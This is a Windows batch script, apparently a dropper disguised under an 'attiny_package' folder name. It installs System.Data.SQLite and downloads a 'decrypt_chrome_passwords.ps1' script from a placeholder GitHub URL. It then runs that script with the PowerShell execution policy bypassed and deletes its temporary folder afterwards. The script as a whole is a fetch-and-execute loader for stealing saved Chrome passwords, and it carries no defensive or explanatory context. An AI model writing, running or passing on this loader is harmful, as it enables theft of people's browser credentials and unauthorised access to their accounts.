@echo off
:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_package
if not exist %tempDir% mkdir %tempDir%

:: Step 2: Check for PowerShell version (ensure it's 5.1 or higher)
powershell -Command "$psVersion = $PSVersionTable.PSVersion; if ($psVersion.Major -lt 5) { Write-Error 'PowerShell 5.1 or higher is required'; exit 1 }"

:: Step 3: Check and install System.Data.SQLite dependency
echo Checking for System.Data.SQLite...
powershell -Command "if (-not (Get-Package -Name System.Data.SQLite -ErrorAction SilentlyContinue)) { Install-Package -Name System.Data.SQLite -Force -Source https://www.nuget.org/api/v2 }"

:: Step 4: Download the PowerShell script
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/your-repo/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"

:: Step 5: Execute the PowerShell script
powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"

:: Step 6: Cleanup
cd /d %temp%
rd /s /q %tempDir%

:: Step 7: Exit
exit
